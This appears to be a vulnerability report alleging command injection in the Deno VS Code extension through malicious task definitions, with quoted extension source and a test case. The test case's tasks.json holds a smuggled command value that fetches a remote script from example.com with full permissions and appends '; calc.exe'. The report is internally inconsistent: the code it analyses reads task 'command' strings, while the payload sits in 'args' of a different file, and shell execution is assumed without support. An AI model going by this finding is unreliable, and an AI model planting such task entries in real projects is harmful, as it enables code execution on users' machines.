- Vulnerability Name: **Command Injection in Deno Task Execution**
- Description:
    - An attacker can craft a malicious `tasks.json` file within a Deno project.
    - This malicious `tasks.json` file can contain a Deno task definition with a command that includes injected system commands.
    - When a user opens this malicious Deno project in VS Code and executes the malicious task (either via the tasks sidebar or by selecting and running a task definition in a `tasks.json` file), the injected commands will be executed by the system.
- Impact:
    - **High**
    - Arbitrary command execution within the user's VS Code environment, running with the privileges of the VS Code process.
    - This could allow an attacker to read sensitive files, modify project files, install malware, or perform other malicious actions on the user's system.
- Vulnerability Rank: **High**
- Currently Implemented Mitigations:
    - None. The extension directly executes commands defined in `tasks.json` without sanitization.
- Missing Mitigations:
    - **Input Sanitization:** The extension should sanitize or validate the `command` and `args` properties of task definitions in `tasks.json` to prevent command injection.
    - **Sandboxing/Isolation:** Ideally, task execution should be sandboxed or isolated to limit the potential impact of command injection vulnerabilities. However, for VS Code extensions, full sandboxing might be challenging.
    - **User Confirmation:** Before executing tasks, especially those defined in workspace files like `tasks.json`, the extension could prompt the user for confirmation, especially if the command looks suspicious or contains potentially dangerous characters.
- Preconditions:
    - The user must have the "Deno for Visual Studio Code" extension installed.
    - The user must open a malicious Deno project in VS Code that contains a crafted `tasks.json` file.
    - The user must execute the malicious task, either via the tasks sidebar or by selecting and running a task definition in a `tasks.json` file.
- Source Code Analysis:
    - **`client\src\tasks_sidebar.ts` - `DenoTasksTreeDataProvider.#runSelectedTask`:**
        ```typescript
        async #runSelectedTask() {
            if (!window.activeTextEditor) {
                window.showErrorMessage("No active text editor.");
                return;
            }
            const taskDefinitions = readTaskDefinitions(
                window.activeTextEditor.document,
            );
            if (!taskDefinitions) {
                window.showErrorMessage("Could not read task definitions.");
                return;
            }
            const anchor = window.activeTextEditor.selection.anchor;
            for (const task of taskDefinitions.tasks) {
                if (
                    anchor.isAfterOrEqual(task.nameRange.start) &&
                    anchor.isBeforeOrEqual(task.valueRange.end)
                ) {
                    const sourceUri = window.activeTextEditor.document.uri;
                    const workspaceFolder = (workspace.workspaceFolders ?? []).find((f) =>
                        sourceUri.toString().startsWith(f.uri.toString())
                    ) ?? workspace.workspaceFolders?.[0];
                    if (!workspaceFolder) {
                        window.showErrorMessage("No workspace folder to use as task scope.");
                        return;
                    }
                    await tasks.executeTask(buildDenoConfigTask(
                        workspaceFolder,
                        await getDenoCommandName(),
                        task.name,
                        task.command, // Task.command is taken directly from tasks.json
                        sourceUri,
                    ));
                    return;
                }
            }
            window.showErrorMessage("Could not find a Deno task at the selection.");
        }
        ```
        - This function is responsible for running a selected task from the `tasks.json` file.
        - It calls `readTaskDefinitions` to parse task definitions from the active text editor's document (which could be `tasks.json`).
        - It iterates through the parsed tasks and if a task is selected (based on cursor position), it extracts `task.command` directly from the parsed definition.
        - It then calls `tasks.executeTask` with this `task.command` without any sanitization or validation.
    - **`client\src\util.ts` - `readTaskDefinitions`:**
        ```typescript
        export function readTaskDefinitions(
          document: TextDocument,
          content = document.getText(),
        ) {
          // ...
          for (const taskProperty of tasksValue.children) {
            // ...
            let command;
            if (taskValue.type == "string") {
              command = taskValue.value; // Command is directly taken from JSON string value
            } else if (taskValue.type == "object" && taskValue.children) {
              const commandProperty = taskValue.children.find((n) =>
                n.type == "property" && n.children?.[0]?.value == "command"
              );
              if (!commandProperty) {
                continue;
              }
              const commandValue = commandProperty.children?.[1];
              if (!commandValue || commandValue.type != "string") {
                continue;
              }
              command = commandValue.value; // Command is directly taken from JSON string value
            } else {
              continue;
            }
            tasks.push({
              name: taskKey.value,
              nameRange: new Range(
                document.positionAt(taskKey.offset),
                document.positionAt(taskKey.offset + taskKey.length),
              ),
              command, // Unsanitized command is stored in task definition
              valueRange: new Range(
                document.positionAt(taskValue.offset),
                document.positionAt(taskValue.offset + taskValue.length),
              ),
            });
          }
          // ...
        }
        ```
        - This function parses `tasks.json` content using `jsoncParser`.
        - It extracts the `command` value from the JSON structure, whether it's a simple string or within an object.
        - The extracted `command` string is directly stored in the `tasks` array without any sanitization or validation.

    - **Visualization:**

    ```
    User Action: Execute Deno Task in VS Code (via sidebar or tasks.json)
        |
        V
    DenoTasksTreeDataProvider.#runSelectedTask
        |
        V
    readTaskDefinitions (parses tasks.json, extracts command)
        |
        V
    tasks.executeTask (executes command from tasks.json without sanitization)
        |
        V
    System Command Execution (potential command injection)
    ```
- Security Test Case:
    1. Create a new Deno project directory.
    2. Inside the project directory, create a `.vscode` folder.
    3. Inside the `.vscode` folder, create a `tasks.json` file with the following content:
        ```json
        {
          "version": "2.0.0",
          "tasks": [
            {
              "label": "Malicious Task",
              "type": "deno",
              "command": "run",
              "args": [
                "-A",
                "-r",
                "https://example.com/malicious_script.ts ; calc.exe"
              ]
            }
          ]
        }
        ```
        *(Note: `calc.exe` is used as a harmless example payload for Windows. For other platforms, you can use commands like `touch /tmp/pwned` or `open /Applications/Calculator.app`)*
    4. Open the project directory in VS Code.
    5. Open the `tasks.json` file in the editor.
    6. Place the cursor within the "Malicious Task" definition in `tasks.json`.
    7. Run the command "Deno: Run Selected Task" from the command palette.
        *Alternatively, you can open the "Deno Tasks" sidebar (if it's visible) and try to execute "Malicious Task" from there.*
    8. Observe that the calculator application (`calc.exe` on Windows, or equivalent command on other platforms) is launched, demonstrating arbitrary command execution.
    9. Additionally, observe that Deno attempts to run the script from `https://example.com/malicious_script.ts`, which may or may not exist, but the injected command `; calc.exe` will still be executed after the `deno run` command.

This test case demonstrates that an attacker can inject and execute arbitrary commands by crafting a malicious `tasks.json` file, and that the VS Code Deno extension executes these tasks without proper sanitization, leading to a command injection vulnerability.
